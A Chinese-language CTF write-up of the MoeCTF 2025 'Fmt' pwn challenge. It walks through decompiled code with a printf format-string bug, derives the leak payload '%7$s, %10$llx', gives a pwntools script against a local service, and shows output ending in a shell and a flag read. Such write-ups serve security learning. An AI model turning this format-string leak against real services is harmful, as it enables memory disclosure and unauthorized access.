---
title: 'XiDianCTF MoeCTF 2025 PWN Fmt'
date: '2026-09-04T19:00:41+08:00'
lastmod: '2026-09-04T19:00:41+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=875)

IDA，然后IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v4; // [rsp+8h] [rbp-88h]
  char s1[16]; // [rsp+10h] [rbp-80h] BYREF
  char s2[16]; // [rsp+20h] [rbp-70h] BYREF
  char s[88]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v4 = (char *)malloc(0x20uLL);
  generate(s2, 5LL);
  generate(v4, 5LL);
  puts("Hey there, little one, what's your name?");
  fgets(s, 80, stdin);
  printf("Nice to meet you,");
  printf(s);
  puts("I buried two treasures on the stack.Can you find them?");
  fgets(s1, 8, stdin);
  if ( strncmp(s1, s2, 5uLL) )
    lose();
  puts("Yeah,another one?");
  fgets(s1, 8, stdin);
  if ( strncmp(s1, v4, 5uLL) )
    lose();
  win();
  return 0;
}
```

注意到需要我们输入正确的s1和v4的值。

这两个值都在栈上。

>  根据题目提示本题为`fmt`。
>
>  构造字符串s来读取寄存器或者栈上的数据。
>
>  依旧是根据奇妙的调用规定[^1],前6个参数去寄存器找，其余的在栈上找。
>
>  但因为格式化字符也是一个参数，所以是除了格式化参数外的前5个参数在寄存器上，其余在栈上。

注意到:

>  char *v4; // [rsp+8h] [rbp-88h]

`v4`在栈顶+8位置上，也就是在栈上第二位，是除格式化参数外第`5 + 2 = 7`个参数。

并且`v4`是指针，我们使用%7$s来读取。



这里我们使用`%10$llx`来读这个数组。

不需要%9$llx，8字节已经足够表达五位字符串。

所以最终构造字符串:

```
%7$s, %10$llx
```



于是，pwntools脚本:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='error')

io = connect("127.0.0.1", 10355)

io.sendline(b'%7$s, %10$llx')

io.interactive()
```

> 为了省事没写接收和处理。

输出:

```
Hey there, little one, what's your name?
Nice to meet you,zZJcA, 7272766e78
I buried two treasures on the stack.Can you find them?
$ xnvrr
Yeah,another one?
$ zZJcA
You got it!
$ ls
bin
flag
lib
lib32
lib64
libexec
pwn
$ cat flag
moectf{THIS_IS_FLAG}
```

> 这里`v4`读出来直接就是字符串
>
> 我们把`s2`数组丢进`CyberChef`[^2]
>
> > `From Hex`
> >
> > `Reverse`
> >
> > `To Hexdump`
> >
> > 后，得到:
> >
> > ```
> > 00000000  78 6e 76 72 72                                   |xnvrr|
> > ```
> >
> > 故字符串为`xnvrr`



[^1]: [x86-64调用约定](https://zh.wikipedia.org/wiki/X86%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A#x86-64%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A)
[^2]:[CyberChef](https://gchq.github.io/CyberChef/)
